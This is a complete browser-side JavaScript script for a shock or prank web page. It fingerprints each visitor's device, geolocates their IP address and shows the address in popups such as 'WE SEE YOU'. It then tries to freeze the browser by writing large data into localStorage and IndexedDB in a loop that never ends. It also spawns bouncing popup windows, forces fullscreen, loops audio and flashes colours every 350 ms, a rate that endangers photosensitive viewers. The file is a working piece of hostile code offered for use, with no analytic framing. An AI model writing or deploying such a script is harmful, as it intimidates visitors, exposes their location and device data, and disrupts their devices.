(async function main(){
  // --- Collect info ---
  const info = {};
  info.userAgent = navigator.userAgent;
  info.platform = navigator.platform;
  info.language = navigator.language;
  info.languages = navigator.languages;
  info.hardwareConcurrency = navigator.hardwareConcurrency;
  info.deviceMemory = navigator.deviceMemory ? navigator.deviceMemory + " GB" : "n/a";
  info.cookieEnabled = navigator.cookieEnabled;
  info.doNotTrack = navigator.doNotTrack;
  info.maxTouchPoints = navigator.maxTouchPoints;
  info.onLine = navigator.onLine;
  info.screen = `${screen.width}x${screen.height}, depth=${screen.colorDepth}, pixelDepth=${screen.pixelDepth}`;
  info.timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
  info.utcOffset = new Date().getTimezoneOffset();
  info.localTime = new Date().toString();
  info.connection = (navigator.connection ? `${navigator.connection.effectiveType || 'unknown'} (${navigator.connection.downlink || '?' } Mbps)` : "unknown");
  try { 
    const battery = await navigator.getBattery(); 
    info.battery = `${(battery.level*100).toFixed(0)}% ${battery.charging ? '⚡ charging' : '🔋'}`; 
  } catch(e){ info.battery = "n/a"; }

  // --- Fetch IP/geo ---
  const bouncerEl = document.getElementById("bouncer");
  try {
    const geo = await fetch("https://ipapi.co/json/").then(r => r.ok ? r.json() : Promise.reject());
    info.ip = geo.ip || "n/a";
    info.city = geo.city || "";
    info.region = geo.region || "";
    info.country = geo.country_name || geo.country || "";
    info.latitude = geo.latitude;
    info.longitude = geo.longitude;
    info.org = geo.org || "";
    info.address = [geo.city, geo.region, geo.country_name].filter(Boolean).join(", ");
    if(bouncerEl) bouncerEl.innerText = info.address || ("IP: " + info.ip || "Locating...");
  } catch(e) {
    info.ip = "IP API failed";
    info.address = "UNKNOWN LOCATION";
    if(bouncerEl) bouncerEl.innerText = "UNKNOWN LOCATION";
  }

  // --- Media devices ---
  try {
    if (navigator.mediaDevices && navigator.mediaDevices.enumerateDevices) {
      const devices = await navigator.mediaDevices.enumerateDevices();
      info.devices = devices.map(d => `${d.kind}: ${d.label || "(no label)"}`);
    }
  } catch(e) { info.devices = []; }

  // --- WebGL GPU info ---
  try {
    const canvas = document.createElement('canvas');
    const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
    if (gl) {
      const dbg = gl.getExtension('WEBGL_debug_renderer_info');
      if (dbg) {
        info.gpu = {
          vendor: gl.getParameter(dbg.UNMASKED_VENDOR_WEBGL),
          renderer: gl.getParameter(dbg.UNMASKED_RENDERER_WEBGL)
        };
      }
    }
  } catch(e){}

  // --- Chaos text ---
  const chaosContainer = document.getElementById('chaosContainer');
  function spawnChaosCopies(text, count=60) {
    if(!chaosContainer) return;
    for(let i=0;i<count;i++){
      const div = document.createElement('div');
      div.className = 'chaos';
      div.innerText = text;
      div.style.position = 'absolute';
      div.style.top = Math.random()*window.innerHeight + "px";
      div.style.left = Math.random()*window.innerWidth + "px";
      div.style.fontSize = (Math.random()*26+8) + "px";
      div.style.opacity = 0.9;
      chaosContainer.appendChild(div);
    }
  }

  function animateChaos() {
    setInterval(()=>{
      const elems = document.querySelectorAll('.chaos');
      elems.forEach(el=>{
        el.style.top = Math.random()*window.innerHeight + "px";
        el.style.left = Math.random()*window.innerWidth + "px";
        el.style.fontSize = (Math.random()*40+6) + "px";
        el.style.color = `hsl(${Math.random()*360},100%,70%)`;
      });
    }, 450);
  }

  // --- Bouncer ---
  function startBouncer() {
    if(!bouncerEl) return;
    bouncerEl.style.left = '60px'; bouncerEl.style.top='60px';
    let x=60,y=60,vx=6,vy=5;
    setInterval(()=>{
      x+=vx; y+=vy;
      if(x<0 || x>window.innerWidth-bouncerEl.offsetWidth) vx=-vx + (Math.random()*2-1);
      if(y<0 || y>window.innerHeight-bouncerEl.offsetHeight) vy=-vy + (Math.random()*2-1);
      bouncerEl.style.left = x+'px'; bouncerEl.style.top = y+'px';
      bouncerEl.style.fontSize = (Math.random()*36 + 12) + 'px';
      bouncerEl.style.color = `hsl(${Math.random()*360},100%,60%)`;
    }, 90);
  }

  // --- Render primary text ---
  const primaryText = Object.entries(info).map(([k,v])=>{
    if(Array.isArray(v)) return `${k.toUpperCase()}:\n  ${v.join('\n  ')}`;
    if(typeof v === 'object') return `${k.toUpperCase()}:\n  ${JSON.stringify(v,null,2)}`;
    return `${k.toUpperCase()}: ${v}`;
  }).join('\n\n');

  // show intro animation then start everything
  showIntroAndStart();

  function showIntroAndStart(){
    const overlay = document.createElement('div');
    overlay.id = 'introOverlay';
    Object.assign(overlay.style, {
      position: 'fixed', inset: '0', background: '#000', display: 'flex', alignItems: 'center', justifyContent: 'center', zIndex: 30000
    });
    const container = document.createElement('div');
    container.style.fontFamily = '"Times New Roman", Times, serif';
    container.style.fontSize = '96px';
    container.style.letterSpacing = '8px';
    container.style.color = '#fff';
    container.style.textAlign = 'center';
    container.style.whiteSpace = 'pre';
    container.style.textShadow = '0 0 20px #fff, 0 0 40px currentColor';
    overlay.appendChild(container);
    document.body.appendChild(overlay);

    const text = '9882136.xyz';
    let i=0;
    const spans = [];
    for(const ch of text){
      const s = document.createElement('span');
      s.innerText = ch;
      // neon color per character
      s.style.color = `hsl(${Math.floor(Math.random()*360)},100%,60%)`;
      s.style.opacity = '0';
      s.style.transition = 'opacity 120ms linear';
      container.appendChild(s);
      spans.push(s);
    }

    const typer = setInterval(()=>{
      if(i>=spans.length){
        clearInterval(typer);
        // keep text in background
        overlay.style.background = 'transparent';
        overlay.style.pointerEvents = 'none';
        startEverything();
        return;
      }
      spans[i].style.opacity='1';
      i++;
    }, 555);
  }

  function startEverything(){
    // now start the original behaviors
    spawnChaosCopies(primaryText);
    animateChaos();
    startBouncer();
    startPopupSpawner(2600);
    setTimeout(slowdownBrowser,2000);
    window.addEventListener('load', ()=>{
      const s=document.getElementById('status');
      if(s) s.innerHTML+='<div>Status: Page loaded. Starting slowdown...</div>';
    });
    setTimeout(recursiveSlowdown,5000);
    startBackgroundFlashes();
    startChaosAudio();
    moveWindowBounce();
    for(let i=0;i<5;i++) spawnBouncingBrowserWindow();
    // keep spawning more popups periodically
    setInterval(()=>spawnBouncingBrowserWindow(), 4000);
  }

  // --- Win95 popups ---
  const beep = document.getElementById('beep');
  function createWin95Popup({title='Notice', lines=[], important=false, lifespan=15000}) {
    const win = document.createElement('div'); win.className='win95-window retro';
    win.style.position='absolute';
    win.style.left = (50 + Math.random()* (window.innerWidth - 370)) + 'px';
    win.style.top = (50 + Math.random()* (window.innerHeight - 200)) + 'px';
    win.style.zIndex = 10000 + Math.floor(Math.random()*1000);

    const titleBar = document.createElement('div'); titleBar.className='win95-title';
    const left = document.createElement('div'); left.className='title-left';
    const icon = document.createElement('span'); icon.className='win95-icon';
    left.appendChild(icon);
    const titleText = document.createElement('span'); titleText.innerText = title; left.appendChild(titleText);
    titleBar.appendChild(left);
    const btns = document.createElement('div'); btns.className='win95-buttons';
    const btnMin = document.createElement('div'); btnMin.className='win95-btn'; btnMin.innerText='—';
    const btnClose = document.createElement('div'); btnClose.className='win95-btn'; btnClose.innerText='X';
    btns.appendChild(btnMin); btns.appendChild(btnClose);
    titleBar.appendChild(btns);
    win.appendChild(titleBar);

    const body = document.createElement('div'); body.className='win95-body';
    const content = document.createElement('div');
    content.innerHTML = lines.map(l=>`<div>${l}</div>`).join('');
    body.appendChild(content); win.appendChild(body);

    const footer = document.createElement('div'); footer.className='win95-footer';
    const ok = document.createElement('button'); ok.className='btn-ok'; ok.innerText='OK';
    footer.appendChild(ok); win.appendChild(footer);
    document.body.appendChild(win);

    if(important) titleText.classList.add('blink');

    // Dragging
    let dragging=false, ox=0, oy=0;
    titleBar.addEventListener('pointerdown', (e)=>{
      dragging=true; ox=e.clientX-win.offsetLeft; oy=e.clientY-win.offsetTop; titleBar.style.cursor='grabbing';
      win.style.zIndex=20000;
    });
    window.addEventListener('pointerup', ()=>{ dragging=false; titleBar.style.cursor='grab'; });
    window.addEventListener('pointermove', (e)=>{ if(dragging){ win.style.left=(e.clientX-ox)+'px'; win.style.top=(e.clientY-oy)+'px'; } });

    btnClose.addEventListener('click', ()=>{
        win.remove();
    });
    ok.addEventListener('click', ()=> win.remove());
    btnMin.addEventListener('click', ()=> {
      if(body.style.display==='none'){ body.style.display='block'; footer.style.display='flex'; }
      else{ body.style.display='none'; footer.style.display='none'; }
    });

    try { beep.currentTime=0; const p=beep.play(); if(p && typeof p.then==='function') p.catch(()=>{}); } catch(e){}

    if(lifespan>0) setTimeout(()=>{ try{ win.remove(); } catch(e){} }, lifespan);
    return win;
  }

  function spawnRandomPopup() {
    const templates = [
      { title: 'LOCATION ALERT', lines: [`YOU LIVE HERE: ${info.address || 'UNKNOWN'}`, `Coordinates: ${info.latitude || 'n/a'}, ${info.longitude || 'n/a'}`, `IP: ${info.ip || 'n/a'}`], important:true, lifespan:12000 },
      { title: 'IP INFO', lines: [`IP ADDRESS: ${info.ip || 'n/a'}`, `ORG: ${info.org || ''}`, `Connection: ${info.connection || ''}`], important:false, lifespan:9000 },
      { title: 'SYSTEM NOTICE', lines: [`PLATFORM: ${info.platform}`, `UA: ${info.userAgent}`, `MEMORY: ${info.deviceMemory}`], important:false, lifespan:9000 },
      { title: 'GPS (maybe?)', lines: [`${info.address ? 'APPARENT ADDRESS' : 'ADDRESS'}: ${info.address}`, `UTC OFFSET: ${info.utcOffset} minutes`, `TIMEZONE: ${info.timezone}`], important:true, lifespan:15000 },
      { title: 'WHOIS', lines: [`IP: ${info.ip}` , `ISP/ORG: ${info.org || 'n/a'}`, `GPU: ${info.gpu ? info.gpu.renderer : 'unknown'}`], important:false, lifespan:10000 },
      { title: 'SPOOKY', lines: [`WE SEE YOU` , `${info.address || '???'}`, `Local time: ${info.localTime}`], important:true, lifespan:13000 }
    ];
    const t = templates[Math.floor(Math.random()*templates.length)];
    createWin95Popup(t);
  }

  let popupInterval = null; let popupSpawnEnabled = true;
  function startPopupSpawner(rateMs=2500) {
    if(popupInterval) clearInterval(popupInterval);
    popupInterval=setInterval(()=>{ if(popupSpawnEnabled) spawnRandomPopup(); }, rateMs);
  }
  startPopupSpawner(2600);

  // --- Controls ---
  const stopBtn = document.getElementById('stopPopups');
  if(stopBtn) stopBtn.addEventListener('click', ()=>{
    popupSpawnEnabled = !popupSpawnEnabled;
    stopBtn.innerText = popupSpawnEnabled ? 'Stop Popups' : 'Resume Popups';
  });
  const spawnBtn = document.getElementById('spawnNow');
  if(spawnBtn) spawnBtn.addEventListener('click', ()=> spawnRandomPopup());
  const clearBtn = document.getElementById('clearChaos');
  if(clearBtn) clearBtn.addEventListener('click', ()=> chaosContainer.innerHTML='');

  for(let i=0;i<3;i++){ setTimeout(spawnRandomPopup, 400*i + (Math.random()*1000)); }

  document.addEventListener('click', (ev)=>{
    const lines = [
      `YOU CLICKED AT: ${ev.clientX}, ${ev.clientY}`,
      `YOU LIVE HERE: ${info.address || 'UNKNOWN'}`,
      `IP: ${info.ip || 'n/a'}`
    ];
    const w = createWin95Popup({title:'CLICK ALERT', lines, important:true, lifespan:8000});
    w.style.left = (ev.clientX + 10)+'px';
    w.style.top = (ev.clientY + 10)+'px';
  });

  // Go fullscreen on click
  document.addEventListener('click', () => document.documentElement.requestFullscreen().catch(() => {}));

  // --- Aggressive random data generator ---
  function generateRandomData(size){ let d=''; for(let i=0;i<size;i++) d+=Math.random().toString(); return d; }
  function createDeepObject(depth,width){ const obj={}; for(let i=0;i<width;i++){ obj[`prop${i}`] = depth>1 ? createDeepObject(depth-1,width) : generateRandomData(16384); } return obj; }

  function storeInLocalStorage(data){
    for(let i=0;i<1000;i++){ setTimeout(()=>{
      const key=`key_${i}`;
      localStorage.setItem(key, JSON.stringify(data));
      const s=document.getElementById('status');
      if(s) s.innerHTML+=`<div>Status: Stored in localStorage ${i}/1000</div>`;
    }, i*50);}
  }

  async function storeInIndexedDB(data){
    const dbPromise=indexedDB.open('slowdown_db',1);
    dbPromise.onupgradeneeded = e => { const db=e.target.result; if(!db.objectStoreNames.contains('data_store')) db.createObjectStore('data_store'); }
    dbPromise.onsuccess=()=>{ const db=dbPromise.result;
      for(let i=0;i<1000;i++){ setTimeout(()=>{
        const t=db.transaction(['data_store'],'readwrite'); const s=t.objectStore('data_store');
        s.put({id:`id_${i}`,data:JSON.stringify(data)});
        const stat=document.getElementById('status'); if(stat) stat.innerHTML+=`<div>Status: Stored in IndexedDB ${i}/1000</div>`;
      },i*50);}
    }
  }

  async function slowdownBrowser(){
    const s=document.getElementById('status');
    if(s) s.innerHTML='<div>Status: Generating random data...</div>';
    const data=createDeepObject(15,100);
    if(s) s.innerHTML+='<div>Status: Starting storage operations...</div>';
    storeInLocalStorage(data);
    await storeInIndexedDB(data);
    if(s) s.innerHTML+='<div>Status: Storage complete!</div>';
  }
  setTimeout(slowdownBrowser,2000);

  window.addEventListener('load', ()=>{
    const s=document.getElementById('status');
    if(s) s.innerHTML+='<div>Status: Page loaded. Starting slowdown...</div>';
  });

  function recursiveSlowdown(){ const data=createDeepObject(15,100); storeInLocalStorage(data); storeInIndexedDB(data); setTimeout(recursiveSlowdown,50); }
  setTimeout(recursiveSlowdown,5000);

  // --- Keep chaos filling on resize ---
  window.addEventListener('resize', ()=>{ spawnChaosCopies(primaryText,8); });


 
  function moveWindowBounce() {
    const VELOCITY = 6, MARGIN = 0, SCREEN_WIDTH = screen.width, SCREEN_HEIGHT = screen.height, TICK_LENGTH = 30;
    let vx = VELOCITY * (Math.random() > 0.5 ? 1 : -1), vy = VELOCITY * (Math.random() > 0.5 ? 1 : -1);
    setInterval(() => {
      const x = window.screenX, y = window.screenY, width = window.outerWidth, height = window.outerHeight;
      if (x < MARGIN) vx = Math.abs(vx);
      if (x + width > SCREEN_WIDTH - MARGIN) vx = -Math.abs(vx);
      if (y < MARGIN) vy = Math.abs(vy);
      if (y + height > SCREEN_HEIGHT - MARGIN) vy = -Math.abs(vy);
      window.moveBy(vx, vy);
    }, TICK_LENGTH);
  }

  function spawnBouncingBrowserWindow() {
    // try to open a popup that's not resizable (browsers may ignore some flags)
    const features = 'width=500,height=300,resizable=no,menubar=no,toolbar=no,location=no,status=no,scrollbars=no';
    const win = window.open('', '_blank', features);
    if (win) {
      // inject a self-contained bouncing script so the popup keeps moving after this page closes
      win.document.write(`
<html>
<head><title>haha</title></head>
<body style="margin:0; padding:0; display:flex; align-items:center; justify-content:center; background:#000; color:#fff; font-size:24px; font-weight:bold;">haha</body>
<script>
let vx = ${6 * (Math.random() > 0.5 ? 1 : -1)}, vy = ${6 * (Math.random() > 0.5 ? 1 : -1)};
function jitterReverseX(){ vx = -vx + (Math.random()*3-1.5); if(Math.abs(vx)<2) vx = Math.sign(vx||1)*2; }
function jitterReverseY(){ vy = -vy + (Math.random()*3-1.5); if(Math.abs(vy)<2) vy = Math.sign(vy||1)*2; }
    setInterval(() => {
  try{
    const x = window.screenX, y = window.screenY, width = window.outerWidth, height = window.outerHeight;
    if (x <= 0) jitterReverseX();
    if (x + width >= screen.width) jitterReverseX();
    if (y <= 0) jitterReverseY();
    if (y + height >= screen.height) jitterReverseY();
    window.moveBy(vx, vy);
    document.body.style.backgroundColor = 'hsl(' + (Math.random()*360) + ',100%,50%)';
  }catch(e){}
}, 30);
</script>
</html>
      `);
      win.document.close();
    }
  }

  function startChaosAudio(){
    const audio=document.createElement('audio'); audio.src='data:audio/wav;base64,UklGRiQAAABXQVZFZm10IBAAAAABAAEAESsAACJWAAACABAAZGF0YQAAAAA='; audio.autoplay=true; audio.loop=true; audio.volume=0.05; document.body.appendChild(audio);
    setInterval(()=>{ audio.volume=Math.random()*0.1+0.05; audio.play().catch(()=>{}); },500);
  }

  function startBackgroundFlashes(){ setInterval(()=>{ document.body.style.backgroundColor=`hsl(${Math.random()*360},100%,90%)`; },350); }

  // intro/start sequence will call the functions when ready

})();
